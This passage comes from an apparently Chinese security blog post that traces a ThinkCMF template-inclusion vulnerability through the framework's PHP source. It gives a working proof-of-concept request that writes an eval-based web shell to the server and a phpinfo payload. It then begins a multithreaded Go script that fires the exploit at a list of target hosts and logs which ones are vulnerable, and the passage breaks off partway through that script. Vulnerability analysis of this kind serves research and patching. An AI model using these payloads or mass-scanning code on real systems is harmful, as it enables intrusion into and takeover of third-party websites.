Think::instance(&#39;Think\\Template&#39;);</span><br><span class="line">                &#x2F;&#x2F;print_r($tpl);</span><br><span class="line">                $tpl-&gt;fetch($_content,$_data[&#39;var&#39;],$_data[&#39;prefix&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure>

<p>跟进<code>fetch</code>进行查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function fetch($templateFile,$templateVar,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    print_r($templateVar); &#x2F;&#x2F;Array ( [waitSecond] &#x3D;&gt; 3 [js_debug] &#x3D;&gt; ?v&#x3D;1607656382 [site_name] &#x3D;&gt; ThinkCMF内容管理框架 [site_host] &#x3D;&gt; http:&#x2F;&#x2F;www.thinkcmf.com&#x2F; [site_root] &#x3D;&gt; [site_icp] &#x3D;&gt; [site_admin_email] &#x3D;&gt; admin@qq.com [site_tongji] &#x3D;&gt; [site_copyright] &#x3D;&gt; [site_seo_title] &#x3D;&gt; ThinkCMF内容管理框架 [site_seo_keywords] &#x3D;&gt; ThinkCMF,php,内容管理框架,cmf,cms,简约风, simplewind,framework [site_seo_description] &#x3D;&gt; ThinkCMF是简约风网络科技发布的一款用于快速开发的内容管理框架 ) </span><br><span class="line">    $this-&gt;tVar         &#x3D;   $templateVar;</span><br><span class="line">    &#x2F;&#x2F; templateFile  readme.md  $prefix &quot;&quot;</span><br><span class="line">    $templateCacheFile  &#x3D;   $this-&gt;loadTemplate($templateFile,$prefix);</span><br><span class="line">    Storage::load($templateCacheFile,$this-&gt;tVar,null,&#39;tpl&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>loadTemplate</code> 进行加载文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; templateFile  readme.md  $prefix &quot;&quot;</span><br><span class="line">&#x2F;&#x2F; 加载主模板并缓存</span><br><span class="line">public function loadTemplate ($templateFile,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    if(is_file($templateFile)) &#123;</span><br><span class="line">        $this-&gt;templateFile    &#x3D;  $templateFile;</span><br><span class="line">        &#x2F;&#x2F; 读取模板文件内容</span><br><span class="line">        $tmplContent &#x3D;  file_get_contents($templateFile);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $tmplContent &#x3D;  $templateFile;</span><br><span class="line">    &#125;</span><br><span class="line">     &#x2F;&#x2F; 根据模版文件名定位缓存文件</span><br><span class="line">    $tmplCacheFile &#x3D; $this-&gt;config[&#39;cache_path&#39;].$prefix.md5($templateFile).$this-&gt;config[&#39;cache_suffix&#39;];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 判断是否启用布局</span><br><span class="line">    if(C(&#39;LAYOUT_ON&#39;)) &#123;</span><br><span class="line">        if(false !&#x3D;&#x3D; strpos($tmplContent,&#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123; &#x2F;&#x2F; 可以单独定义不使用布局</span><br><span class="line">            $tmplContent &#x3D; str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;,&#39;&#39;,$tmplContent);</span><br><span class="line">        &#125;else&#123; &#x2F;&#x2F; 替换布局的主体内容</span><br><span class="line">            $layoutFile  &#x3D;  THEME_PATH.C(&#39;LAYOUT_NAME&#39;).$this-&gt;config[&#39;template_suffix&#39;];</span><br><span class="line">            &#x2F;&#x2F; 检查布局文件</span><br><span class="line">            if(!is_file($layoutFile)) &#123;</span><br><span class="line">                E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$layoutFile);</span><br><span class="line">            &#125;</span><br><span class="line">            $tmplContent &#x3D; str_replace($this-&gt;config[&#39;layout_item&#39;],$tmplContent,file_get_contents($layoutFile));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 编译模板内容</span><br><span class="line">    $tmplContent &#x3D;  $this-&gt;compiler($tmplContent);</span><br><span class="line">    Storage::put($tmplCacheFile,trim($tmplContent),&#39;tpl&#39;);</span><br><span class="line">    &#x2F;&#x2F;echo  $tmplCacheFile; </span><br><span class="line">    &#x2F;&#x2F;Array ( [waitSecond] &#x3D;&gt; 3 [js_debug] &#x3D;&gt; ?v&#x3D;1607656634 [site_name] &#x3D;&gt; ThinkCMF内容管理框架 [site_host] &#x3D;&gt; http:&#x2F;&#x2F;www.thinkcmf.com&#x2F; [site_root] &#x3D;&gt; [site_icp] &#x3D;&gt; [site_admin_email] &#x3D;&gt; admin@qq.com [site_tongji] &#x3D;&gt; [site_copyright] &#x3D;&gt; [site_seo_title] &#x3D;&gt; ThinkCMF内容管理框架 [site_seo_keywords] &#x3D;&gt; ThinkCMF,php,内容管理框架,cmf,cms,简约风, simplewind,framework [site_seo_description] &#x3D;&gt; ThinkCMF是简约风网络科技发布的一款用于快速开发的内容管理框架 ) C:\phpstudy_pro\WWW\ThinkCMFX&#x2F;data&#x2F;runtime&#x2F;Cache&#x2F;Portal&#x2F;04c6e90faac2675aa89e2176d2eec7d8.php</span><br><span class="line">    return $tmplCacheFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>loadTemplate</code> 这里返回了一个数组，返回<code>fetch</code>查看进行了加载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function fetch($templateFile,$templateVar,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    print_r($templateVar); &#x2F;&#x2F;Array ( [waitSecond] &#x3D;&gt; 3 [js_debug] &#x3D;&gt; ?v&#x3D;1607656382 [site_name] &#x3D;&gt; ThinkCMF内容管理框架 [site_host] &#x3D;&gt; http:&#x2F;&#x2F;www.thinkcmf.com&#x2F; [site_root] &#x3D;&gt; [site_icp] &#x3D;&gt; [site_admin_email] &#x3D;&gt; admin@qq.com [site_tongji] &#x3D;&gt; [site_copyright] &#x3D;&gt; [site_seo_title] &#x3D;&gt; ThinkCMF内容管理框架 [site_seo_keywords] &#x3D;&gt; ThinkCMF,php,内容管理框架,cmf,cms,简约风, simplewind,framework [site_seo_description] &#x3D;&gt; ThinkCMF是简约风网络科技发布的一款用于快速开发的内容管理框架 ) </span><br><span class="line">    $this-&gt;tVar         &#x3D;   $templateVar;</span><br><span class="line">    &#x2F;&#x2F; templateFile  readme.md  $prefix &quot;&quot;</span><br><span class="line">    $templateCacheFile  &#x3D;   $this-&gt;loadTemplate($templateFile,$prefix);</span><br><span class="line">    &#x2F;&#x2F; 跟进，这里进行了文件包含</span><br><span class="line">    Storage::load($templateCacheFile,$this-&gt;tVar,null,&#39;tpl&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>Storage::load</code>最终造成文件包含：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function load($_filename,$vars&#x3D;null)&#123;</span><br><span class="line">    &#x2F;&#x2F;echo $_filename; 缓存文件名</span><br><span class="line">    if(!is_null($vars))&#123;</span><br><span class="line">        extract($vars, EXTR_OVERWRITE);</span><br><span class="line">    &#125;</span><br><span class="line">    include $_filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="第二种-1"><a href="#第二种-1" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;fetch&amp;templateFile&#x3D;public&#x2F;index&amp;prefix&#x3D;&#39;&#39;&amp;content&#x3D;&lt;php&gt;file_put_contents(&#39;shandianbian.php&#39;,&#39;&lt;?php @eval($_GET[cmd]) ?&gt;&#39;)&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure>

<p>查看POC ,还是要走进<code>fetch</code>方法</p>
<p>![image](<a href="https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image">https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image</a> (3).png)</p>
<p><code>AppframeController</code> -&gt; <code>Controller</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected function fetch($templateFile&#x3D;&#39;&#39;,$content&#x3D;&#39;&#39;,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    return $this-&gt;view-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>view</code>视图中寻找<code>fetch</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public function fetch($templateFile&#x3D;&#39;&#39;,$content&#x3D;&#39;&#39;,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">    if(empty($content)) &#123;</span><br><span class="line">        $templateFile   &#x3D;   $this-&gt;parseTemplate($templateFile);</span><br><span class="line">        &#x2F;&#x2F; 模板文件不存在直接返回</span><br><span class="line">        if(!is_file($templateFile)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$templateFile);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        defined(&#39;THEME_PATH&#39;) or    define(&#39;THEME_PATH&#39;, $this-&gt;getThemePath());</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 页面缓存</span><br><span class="line">    ob_start();</span><br><span class="line">    ob_implicit_flush(0);</span><br><span class="line">    if(&#39;php&#39; &#x3D;&#x3D; strtolower(C(&#39;TMPL_ENGINE_TYPE&#39;))) &#123; &#x2F;&#x2F; 使用PHP原生模板</span><br><span class="line">        $_content   &#x3D;   $content;</span><br><span class="line">        &#x2F;&#x2F; 模板阵列变量分解成为独立变量</span><br><span class="line">        extract($this-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">        &#x2F;&#x2F; 直接载入PHP模板</span><br><span class="line">        empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        &#x2F;&#x2F; 视图解析标签</span><br><span class="line">        $params &#x3D; array(&#39;var&#39;&#x3D;&gt;$this-&gt;tVar,&#39;file&#39;&#x3D;&gt;$templateFile,&#39;content&#39;&#x3D;&gt;$content,&#39;prefix&#39;&#x3D;&gt;$prefix);</span><br><span class="line">        &#x2F;&#x2F;print_r($params);</span><br><span class="line">        Hook::listen(&#39;view_parse&#39;,$params);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 获取并清空缓存</span><br><span class="line">    $content &#x3D; ob_get_clean();</span><br><span class="line">    &#x2F;&#x2F; 内容过滤标签</span><br><span class="line">    Hook::listen(&#39;view_filter&#39;,$content);</span><br><span class="line">    &#x2F;&#x2F; 输出模板文件</span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基础的信息和上面的漏洞利用一样，只是调用的action变成了fetch，然后多加了content，还是进入fetch()-&gt;Hook::listen()-&gt;File.class.php.load()-&gt;include，成功执行传入content代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Template.class.php</span><br><span class="line"></span><br><span class="line">    public function loadTemplate ($templateFile,$prefix&#x3D;&#39;&#39;) &#123;</span><br><span class="line">        if(is_file($templateFile)) &#123;</span><br><span class="line">            $this-&gt;templateFile    &#x3D;  $templateFile;</span><br><span class="line">            &#x2F;&#x2F; 读取模板文件内容</span><br><span class="line">            $tmplContent &#x3D;  file_get_contents($templateFile);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $tmplContent &#x3D;  $templateFile;</span><br><span class="line">        &#125;</span><br><span class="line">         &#x2F;&#x2F; 根据模版文件名定位缓存文件</span><br><span class="line">        $tmplCacheFile &#x3D; $this-&gt;config[&#39;cache_path&#39;].$prefix.md5($templateFile).$this-&gt;config[&#39;cache_suffix&#39;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 判断是否启用布局</span><br><span class="line">        if(C(&#39;LAYOUT_ON&#39;)) &#123;</span><br><span class="line">            if(false !&#x3D;&#x3D; strpos($tmplContent,&#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123; &#x2F;&#x2F; 可以单独定义不使用布局</span><br><span class="line">                $tmplContent &#x3D; str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;,&#39;&#39;,$tmplContent);</span><br><span class="line">            &#125;else&#123; &#x2F;&#x2F; 替换布局的主体内容</span><br><span class="line">                $layoutFile  &#x3D;  THEME_PATH.C(&#39;LAYOUT_NAME&#39;).$this-&gt;config[&#39;template_suffix&#39;];</span><br><span class="line">                &#x2F;&#x2F; 检查布局文件</span><br><span class="line">                if(!is_file($layoutFile)) &#123;</span><br><span class="line">                    E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$layoutFile);</span><br><span class="line">                &#125;</span><br><span class="line">                $tmplContent &#x3D; str_replace($this-&gt;config[&#39;layout_item&#39;],$tmplContent,file_get_contents($layoutFile));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 编译模板内容</span><br><span class="line"></span><br><span class="line">        $tmplContent &#x3D;  $this-&gt;compiler($tmplContent);</span><br><span class="line">        &#x2F;&#x2F; 进入PUT 进行查看</span><br><span class="line">        Storage::put($tmplCacheFile,trim($tmplContent),&#39;tpl&#39;);</span><br><span class="line">        &#x2F;&#x2F;echo  $tmplCacheFile; </span><br><span class="line">        &#x2F;&#x2F;Array ( [waitSecond] &#x3D;&gt; 3 [js_debug] &#x3D;&gt; ?v&#x3D;1607656634 [site_name] &#x3D;&gt; ThinkCMF内容管理框架 [site_host] &#x3D;&gt; http:&#x2F;&#x2F;www.thinkcmf.com&#x2F; [site_root] &#x3D;&gt; [site_icp] &#x3D;&gt; [site_admin_email] &#x3D;&gt; admin@qq.com [site_tongji] &#x3D;&gt; [site_copyright] &#x3D;&gt; [site_seo_title] &#x3D;&gt; ThinkCMF内容管理框架 [site_seo_keywords] &#x3D;&gt; ThinkCMF,php,内容管理框架,cmf,cms,简约风, simplewind,framework [site_seo_description] &#x3D;&gt; ThinkCMF是简约风网络科技发布的一款用于快速开发的内容管理框架 ) C:\phpstudy_pro\WWW\ThinkCMFX&#x2F;data&#x2F;runtime&#x2F;Cache&#x2F;Portal&#x2F;04c6e90faac2675aa89e2176d2eec7d8.php</span><br><span class="line">        return $tmplCacheFile;</span><br></pre></td></tr></table></figure>

<p>File.class.php 进入PUT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function put($filename,$content,$type&#x3D;&#39;&#39;)&#123;</span><br><span class="line">    $dir         &#x3D;  dirname($filename);</span><br><span class="line">    if(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir,0777,true);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $filename;</span><br><span class="line">    echo ,$content;</span><br><span class="line">    if(false &#x3D;&#x3D;&#x3D; file_put_contents($filename,$content))&#123;</span><br><span class="line">        E(L(&#39;_STORAGE_WRITE_ERROR_&#39;).&#39;:&#39;.$filename);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $this-&gt;contents[$filename]&#x3D;$content;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个大佬的流程，分析的比较清楚</p>
<ol>
<li><a href="https://www.cnblogs.com/0daybug/p/11790619.html" target="_blank" rel="noopener">Thinkcmf任意漏洞包含漏洞分析复现</a></li>
<li><a href="https://www.anquanke.com/post/id/189712c" target="_blank" rel="noopener">TinkcmfX 前台任意代码执行分析</a> </li>
</ol>
<p>![image](<a href="https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image">https://www.shangzeng.club/2020/12/14/thincmf2-2-3任意内容包含漏洞/image</a> (4).png)</p>
<h2 id="漏洞批量挖掘扫描"><a href="#漏洞批量挖掘扫描" class="headerlink" title="漏洞批量挖掘扫描"></a>漏洞批量挖掘扫描</h2><p>基本流程： 获取目标氛围 + POC批量扫描</p>
<p>使用patyload : <code>http://www.thinkcmf.com/?a=fetch&amp;content=%3C?=phpinfo();exit();</code></p>
<h3 id="批量获取"><a href="#批量获取" class="headerlink" title="批量获取"></a>批量获取</h3><p>编写多线程脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;time&quot;</span><br><span class="line">	&quot;sync&quot;</span><br><span class="line">	&quot;bufio&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;net&quot;</span><br><span class="line">	&quot;regexp&quot;</span><br><span class="line">	&quot;net&#x2F;http&quot;</span><br><span class="line">	&quot;crypto&#x2F;tls&quot;</span><br><span class="line">	&quot;io&#x2F;ioutil&quot;</span><br><span class="line">	&quot;golang.org&#x2F;x&#x2F;text&#x2F;transform&quot;</span><br><span class="line">	&quot;golang.org&#x2F;x&#x2F;text&#x2F;encoding&quot;</span><br><span class="line">	&quot;golang.org&#x2F;x&#x2F;text&#x2F;encoding&#x2F;unicode&quot;</span><br><span class="line">	&quot;golang.org&#x2F;x&#x2F;net&#x2F;html&#x2F;charset&quot;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	ch 			chan bool</span><br><span class="line">	wg          sync.WaitGroup</span><br><span class="line">	filename    string</span><br><span class="line">	savename    string</span><br><span class="line">	path        string</span><br><span class="line">	threads     int</span><br><span class="line">	timeout     int</span><br><span class="line">	titleRe &#x3D; regexp.MustCompile(&#96;&gt;(.*?)\s?&lt;&#x2F;title&gt;&#96;)</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func init() &#123;</span><br><span class="line">	threads  &#x3D; 3                       						    &#x2F;&#x2F; 线程数量</span><br><span class="line">	timeout  &#x3D; 2                        			            &#x2F;&#x2F; 超时</span><br><span class="line">	path     &#x3D; &quot;&#x2F;?a&#x3D;fetch&amp;content&#x3D;%3C?&#x3D;phpinfo();exit();&quot;       &#x2F;&#x2F; 请求路径</span><br><span class="line">	filename &#x3D; &quot;test.txt&quot;              					    &#x2F;&#x2F; 读取路径</span><br><span class="line">	savename &#x3D; &quot;save.txt&quot;                						&#x2F;&#x2F; 存储结果路径</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	ch &#x3D; make(chan bool, threads)</span><br><span class="line">	urllist , num, err :&#x3D; readLines(filename)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;读取路径数据错误 ！&quot; , err)</span><br><span class="line">		os.Exit(0)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;共扫描：&quot;,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	for _, v :&#x3D; range urllist &#123;</span><br><span class="line">		urlpath :&#x3D; &quot;http:&#x2F;&#x2F;&quot; + v + path</span><br><span class="line">		ch &lt;- true</span><br><span class="line">		wg.Add(1)</span><br><span class="line">		go requestworker(urlpath)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func requestworker(url string) &#123;</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		&lt;-ch</span><br><span class="line">		wg.Done()</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	var req *http.Request</span><br><span class="line">	var err error</span><br><span class="line"></span><br><span class="line">	req, err &#x3D; http.NewRequest(&quot;GET&quot;, url, nil)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;请求错误 ！&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	client :&#x3D; createHTTPClient()</span><br><span class="line">	time.Sleep(1e9) </span><br><span class="line">	resp, err1 :&#x3D; client.Do(req)</span><br><span class="line">	if err1 !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;网站超时错误 ！&quot;,url,err1)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line"></span><br><span class="line">	reader :&#x3D; bufio.NewReader(resp.Body)</span><br><span class="line">	e :&#x3D; determineEncoding(reader)</span><br><span class="line">	utf8Reader :&#x3D; transform.NewReader(reader, e.NewDecoder())</span><br><span class="line">	bodyss, err :&#x3D; ioutil.ReadAll(utf8Reader)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		bodyss &#x3D; []byte(&quot;&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	respBody :&#x3D; string(bodyss)</span><br><span class="line">	matched, err :&#x3D; regexp.MatchString(&quot;phpinfo()&quot;, respBody)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;正则匹配错误 ！ &quot;,err)</span><br><span class="line">		os.Exit(0)		</span><br><span class="line">	&#125;</span><br><span class="line">	if matched &#123;</span><br><span class="line">		fmt.Println(url+&quot;存在thinkcmf文件包含漏洞 ！&quot;)</span><br><span class="line">		tracefile(url+&quot;\n&quot;,savename)</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		fmt.Println(url+&quot;漏洞不存在 ！&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func tracefile(str_content,savename string)  &#123;</span><br><span class="line">    fd,_:&#x3D;os.OpenFile(savename,os.O_RDWR|os.O_CREATE|os.O_APPEND,0644)</span><br><span class="line">    fd_content:&#x3D;str_content</span><br><span class="line">    buf:&#x3D;[]byte(fd_content)</span><br><span class="line">    fd.Write(buf)</span><br><span class="line">    fd.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func determineEncoding(r *bufio.Reader) encoding.Encoding &#123;</span><br><span class="line">	b, err :&#x3D; r.Peek(1024)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return unicode.UTF8</span><br><span class="line">	&#125;</span><br><span class="line">	e, _, _ :&#x3D; charset.DetermineEncoding(b, &quot;&quot;)</span><br><span class="line">	return e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func createHTTPClient() *http.Client &#123;</span><br><span class="line">	&#x2F;&#x2F; 不校验证书</span><br><span class="line">	tr :&#x3D; &amp;http.Transport&#123;</span><br><span class="line">		Dial: (&amp;net.Dialer&#123;</span><br><span class="line">			Timeout:   time.Duration(timeout) * time.Second,</span><br><span class="line">			Deadline:  time.Now().Add(time.Duration(timeout) * time.Second),</span><br><span class="line">			KeepAlive: time.Duration(timeout) * time.Second,</span><br><span class="line">		&#125;).Dial,</span><br><span class="line">		